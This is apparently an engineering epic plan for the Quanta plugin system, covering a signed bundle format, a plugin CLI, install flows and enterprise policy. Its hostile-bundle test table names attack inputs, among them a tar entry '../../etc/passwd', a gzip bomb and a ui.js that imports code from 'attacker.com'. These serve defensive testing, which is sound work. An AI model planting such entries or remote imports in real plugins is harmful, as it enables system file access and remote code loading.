# Epic E — Distribution and Marketplace

- **Parent**: `docs/rfc/0004-plugin-system.md`, `docs/plans/0004-plugin-system/README.md`
- **Depends on**: Epic A (manifest)
- **Duration**: 2 weeks
- **Status**: Draft

Epic E ships the bundle format, the signing pipeline, and the `quanta-plugin-cli` tool. The actual marketplace (discovery, hosting, payments) is out of scope and tracked as RFC 0004.1. v1 supports local file install, developer hot-reload, and enterprise drop-in.

---

## 1. Goal

Make plugins distributable as self-contained, signed artifacts. Give plugin authors a CLI that handles scaffolding, building, local testing, and publishing. Give users a drag-and-drop install path and enterprise admins a managed-plugins directory.

By end of epic:

- `.quanta-plugin` bundle format specified and versioned.
- Ed25519 signing tooling; signature verification integrated with Epic B's load path.
- `quanta-plugin-cli` (`new`, `build`, `dev`, `publish`, `validate`, `test`).
- Install UI (drag-and-drop + file-picker + CLI `--install`).
- Enterprise managed-plugins directory (`$APP_CONFIG_DIR/plugins-managed/`).

---

## 2. Non-goals

- Marketplace backend (RFC 0004.1).
- Payment / revenue share (RFC 0004.1).
- Auto-update from a remote feed (v1 is local-file only; a minimal update check for first-party plugins may land in v1.1).
- Certificate authority operation (v1 accepts self-signed; CA discussion in open questions).

---

## 3. Bundle format

### 3.1 Container

A `.quanta-plugin` file is a **gzipped tar archive** with a fixed internal layout:

```
plugin.json                 (manifest)
signature.sig               (Ed25519 signature over canonical digest)
public_key.pem              (author's public key; Ed25519)
plugin.wasm                 (optional; present if manifest.entrypoints.host)
ui.js                       (optional; present if manifest.entrypoints.ui)
assets/
  icon.png                  (required if manifest.icon set)
  locales/
    en.json                 (required if manifest.i18n.default_locale = "en")
    …
LICENSE                     (required)
README.md                   (optional; displayed in plugin details view)
CHANGELOG.md                (optional)
```

Constraints:

- Total uncompressed size ≤ 25 MiB.
- File count ≤ 200.
- No symlinks.
- No path traversal.
- No files outside the paths above (i.e. no `../`, no absolute tar entries).
- Max single file size: 8 MiB.

### 3.2 Canonical digest

Computed as specified in RFC 0004 §16:

```
digest = SHA-256(
  sorted_concat(
    for f in bundle.files if f.name != "signature.sig":
      utf8("path=" + f.name + "\n" + "size=" + f.size + "\n") || f.bytes || "\n"
  )
)
```

Paths are sorted byte-lex. The sort key is the raw UTF-8 byte sequence of the path as it appears in the tar header.

Test vectors are committed to `crates/quanta-plugin-host/tests/fixtures/digest-vectors.json` so any implementation of the CLI or host agrees on the exact bytes.

### 3.3 Signature

Ed25519 signature over the canonical digest. The signature is 64 bytes raw; stored in `signature.sig` as 64 raw bytes (not hex, not base64).

The author's public key is included in the bundle in PEM format (`public_key.pem`, SubjectPublicKeyInfo). The public key is **also** referenced in the manifest's signed canonical digest via the file itself — you can't swap public keys without invalidating the signature.

---

## 4. Signing

### 4.1 Keys

- Algorithm: Ed25519.
- Key files: PEM (`-----BEGIN PRIVATE KEY-----` PKCS#8).
- Public keys distributed as `.pem` or as a 64-char hex string for display.

### 4.2 Trust model

Three tiers at v1:

- **First-party** (signed by Quanta's baked-in root key). Shipped with the product; no prompt surprise; auto-updates bypass the delta prompt if permissions unchanged.
- **User-trusted**. Unknown key that the user accepted at install with the "Trust this developer for future plugins" checkbox. Persisted to a trust store (`$APP_CONFIG_DIR/trusted-keys.json`).
- **Self-signed, untrusted**. First install of a plugin signed by an unknown key; user sees an extra "this plugin is not from a known developer" warning panel in the install prompt.

Un-signed bundles are **rejected outright** in v1. No exceptions.

### 4.3 Revocation

Keys can be blacklisted via `$APP_CONFIG_DIR/revoked-keys.json` (per-user) or via an enterprise-managed file. A blacklisted key causes:

- Any new install with that key → rejected.
- Any existing install signed by that key → flagged in the Plugins tab with a red banner; loading is blocked.

First-party revocations are fetched by the host on startup from a hard-coded URL (e.g. `https://updates.quanta.sh/revoked-keys.json`), signed by a higher root key. This gives us a way to kill malicious first-party-signed plugins without waiting for a host update.

### 4.4 Signing at publish time

`quanta-plugin publish --key path/to/private.pem` performs:

1. Build the bundle contents (see §5.2).
2. Compute canonical digest.
3. Sign the digest with the private key.
4. Write `signature.sig` into the tar.
5. Write `public_key.pem` derived from the private key.
6. Emit `<id>-<version>.quanta-plugin`.

Private keys never leave the author's machine. There is no "upload key to server" flow in v1.

### 4.5 Signing for first-party plugins

First-party plugins are signed by a CI build step using a key stored in the Quanta build-secret store. The key material is held in a hardware HSM for releases; developer builds use an internal testing key clearly labelled as such.

---

## 5. `quanta-plugin-cli`

Binary name: `quanta-plugin`. Installed via Quanta's own installer or `cargo install quanta-plugin-cli`.

### 5.1 Commands

```
quanta-plugin new <name> [--rust | --ts]
quanta-plugin build
quanta-plugin dev
quanta-plugin publish [--key <path>] [--output <dir>]
quanta-plugin validate <path>
quanta-plugin test [--filter <glob>]
quanta-plugin install <bundle>
quanta-plugin uninstall <plugin-id>
quanta-plugin list
quanta-plugin keys (generate | list | import | export | revoke)
```

### 5.2 `new`

Scaffolds a plugin directory:

```
my-plugin/
  plugin.json
  src/
    lib.rs | ui.ts
  package.json | Cargo.toml
  README.md
  LICENSE (MIT by default; prompt on create)
  .gitignore
  .github/
    workflows/
      build.yml  (runs quanta-plugin build + validate on PR)
  tests/
    smoke.test.ts | smoke.rs
```

Templates include:

- A hello-world `_activate` that registers one palette entry showing a toast.
- A `plugin.json` with every field populated as a teaching example, including a commented permissions block the user edits to match actual needs.
- A test harness stub that runs the plugin against `quanta-plugin test`'s mock host.

### 5.3 `build`

- Validates the manifest (Epic A).
- Runs the language toolchain: `cargo build --release --target wasm32-wasi` for Rust, `esbuild` for TS.
- Bundles into a working directory that mirrors the final `.quanta-plugin` layout.
- Does **not** sign (that's `publish`).
- Produces an unsigned `.quanta-plugin-unsigned.tar.gz` artifact for inspection / review before signing.

### 5.4 `dev`

- Symlinks the source directory into `$APP_CONFIG_DIR/plugins-dev/<id>/`.
- Registers the plugin with the running Quanta instance (if any; else prints a note to start Quanta).
- Watches source files; on change, rebuilds and triggers hot reload (see Epic B).
- Any permission change → Quanta re-prompts as for an install.
- Output is the plugin's console.log / stderr streamed to the dev CLI.

### 5.5 `publish`

- Runs `build` first.
- Prompts for a key unless `--key` given.
- Writes `signature.sig` and `public_key.pem`.
- Emits the final `.quanta-plugin` with a printed SHA-256 of the bundle.

### 5.6 `validate`

Covered primarily by Epic A; the CLI surface here runs the same validator against either a manifest file or a full bundle (schema + file presence + size limits + sanity checks on WASM/JS content).

### 5.7 `test`

Runs the plugin's unit tests. For TS plugins: `vitest`. For Rust plugins: `cargo test` with a mock host crate (`quanta-plugin-sdk-test`).

### 5.8 `install` / `uninstall` / `list`

- `install <bundle>`: verifies signature, launches Quanta's permission prompt (if Quanta is running) or defers to next Quanta launch.
- `uninstall <id>`: removes the plugin and archives its audit log.
- `list`: prints installed plugins with version, grants, source (first-party / user-trusted / self-signed / dev).

### 5.9 `keys`

- `generate`: makes a new Ed25519 pair, writes to `~/.config/quanta-plugin/keys/<name>.pem` + `.pub`.
- `list`: lists local keys and any keys in the trust store.
- `import <pem>`: adds a public key to the trust store (equivalent to checking the "trust this developer" box).
- `export <name>`: emits the public key in hex for sharing.
- `revoke <key-hex>`: adds a key to the local revocation list.

---

## 6. Install UI

### 6.1 Drag-and-drop

Drop a `.quanta-plugin` onto the Quanta window → opens the install flow:

1. Verify bundle integrity.
2. Verify signature.
3. Resolve trust state (first-party / user-trusted / self-signed).
4. Show permission prompt (Epic D).
5. On accept: unpack to `$APP_CONFIG_DIR/plugins/<id>/` and enable.

### 6.2 Settings install

Settings → Plugins → "Install from file…" opens a native file picker; same flow as drag-and-drop.

### 6.3 CLI install

`quanta-plugin install foo.quanta-plugin` sends the file path via IPC to a running Quanta; same prompt flow. If no Quanta is running, the CLI stages the bundle; Quanta picks it up on next launch.

### 6.4 Enterprise managed install

Admins place `.quanta-plugin` bundles in `$APP_CONFIG_DIR/plugins-managed/`. On Quanta launch:

- Each managed bundle is loaded with permissions **pre-granted** (the admin is the trust boundary).
- Managed plugins cannot be disabled by the user.
- The Plugins tab shows a "Managed by your organisation" badge.
- Managed plugins must be signed by a key listed in the enterprise trust store (typically a per-org CA).

---

## 7. Work breakdown

### Sprint 1 (week 1)

- **E-1.1** Bundle format spec + validator (extends Epic A's manifest validator).
- **E-1.2** Canonical digest implementation + test vectors.
- **E-1.3** Ed25519 signing / verification library (thin wrapper around `ed25519-dalek`).
- **E-1.4** Trust store + revocation list format.
- **E-1.5** `quanta-plugin-cli` skeleton with `new`, `validate`.
- **E-1.6** `new` scaffold templates (Rust + TS).

### Sprint 2 (week 2)

- **E-2.1** `build`, `publish`, `test`, `keys` subcommands.
- **E-2.2** `dev` with hot-reload integration (uses Epic B's hot reload).
- **E-2.3** Install UI: drag-and-drop + file-picker.
- **E-2.4** Managed-plugins loader.
- **E-2.5** `install` / `uninstall` / `list` IPC.
- **E-2.6** First-party root key embedding.
- **E-2.7** Tests: sign-verify, trust store, revocation, hostile bundles (tampered tar, wrong signature, missing files, symlinks).
- **E-2.8** Docs: publishing guide, enterprise distribution guide.

---

## 8. Hostile-bundle test suite

| # | Name | Attack | Expected outcome |
| --- | --- | --- | --- |
| E1 | `tampered.quanta-plugin` | Byte modified after sign | Signature fails; reject. |
| E2 | `wrong-pubkey.quanta-plugin` | Public key swapped, signature valid for a different key | Digest inputs include the pubkey file → digest mismatch → reject. |
| E3 | `path-traversal.quanta-plugin` | Tar entry `../../etc/passwd` | Rejected at validation. |
| E4 | `symlink.quanta-plugin` | Symlink entry | Rejected. |
| E5 | `too-large.quanta-plugin` | 100 MiB file | Rejected (size cap). |
| E6 | `bomb.tar.gz` | Gzip-bomb expanding to 10 GiB | Rejected (hard max-decompress ratio). |
| E7 | `missing-manifest.quanta-plugin` | No `plugin.json` | Rejected. |
| E8 | `double-entry.quanta-plugin` | Two entries for `plugin.json` | Rejected. |
| E9 | `unsigned.quanta-plugin` | No `signature.sig` | Rejected in v1. |
| E10 | `revoked-key.quanta-plugin` | Valid sign by a key on revocation list | Rejected. |
| E11 | `different-id.quanta-plugin` | Bundle id != manifest id | Rejected. |
| E12 | `broken-wasm.quanta-plugin` | Corrupted WASM | Rejected at pre-load validation. |
| E13 | `js-with-dynamic-import.quanta-plugin` | `ui.js` contains `import("https://attacker.com")` | Static analysis flags; rejected. |
| E14 | `manifest-version-future.quanta-plugin` | `manifest_version: 99` | Rejected. |
| E15 | `missing-license.quanta-plugin` | No LICENSE file | Rejected with helpful error. |
| E16 | `absolute-entry.quanta-plugin` | Tar entry with absolute path | Rejected. |

All 16 must pass.

---

## 9. Enterprise considerations

### 9.1 Managed trust store

`$APP_CONFIG_DIR/enterprise-trusted-keys.json` contains org-provisioned public keys. A managed Quanta install (MDM-deployed) locks this file; users cannot add or remove entries.

### 9.2 Managed policy

A companion `enterprise-policy.json` can specify:

- `allow_user_install: bool` — if false, users cannot install any non-managed plugin.
- `allowed_signatures: string[]` — allowlist of pubkey hexes.
- `denied_plugins: string[]` — blocklist of plugin ids.
- `required_plugins: string[]` — plugins that must be installed (managed bundles).

These are enforced in the host's plugin-loading path; the UI reads them to hide relevant controls ("disabled by policy").

### 9.3 Audit export

Managed builds can enable `enterprise_audit_export` which streams a duplicate of every audit entry to a syslog endpoint configured in policy. (v1 ships the hook points; the actual syslog transport is an enterprise-build-only feature.)

---

## 10. Risks & mitigations

| Risk | Mitigation |
| --- | --- |
| Author loses their private key | No central recovery; they ship a new plugin-id with a new key. Users migrate. Documented clearly. |
| Key-compromise floods all users | Revocation list; first-party push-refresh; blacklist propagation on next launch. |
| Bundle decompression DoS | Max compressed size, max decompression ratio, per-entry size cap. |
| CLI stores keys in plaintext | Default ~/.config/quanta-plugin/keys with 0600; warn on creation; recommend a password manager for secure backup. |
| Enterprise policy file tampering | File is loaded with strict perms and checksummed against a companion signature; MDM-deployed users can't bypass. |

---

## 11. Acceptance criteria

- [ ] Bundle spec implemented; 16 hostile-bundle tests pass.
- [ ] Canonical digest vectors committed and cross-platform.
- [ ] Ed25519 sign/verify pipeline works.
- [ ] Trust store + revocation list implemented.
- [ ] `quanta-plugin-cli` ships all 9 subcommands.
- [ ] Install UI (drag-and-drop + file picker + CLI `install`) works.
- [ ] Managed-plugins directory loads and enforces no-disable.
- [ ] Docs: publishing guide, enterprise guide.

---

## 12. Change history

| Date | Author | Change |
| --- | --- | --- |
| 2026-04-20 | Platform Team | Initial epic plan. |
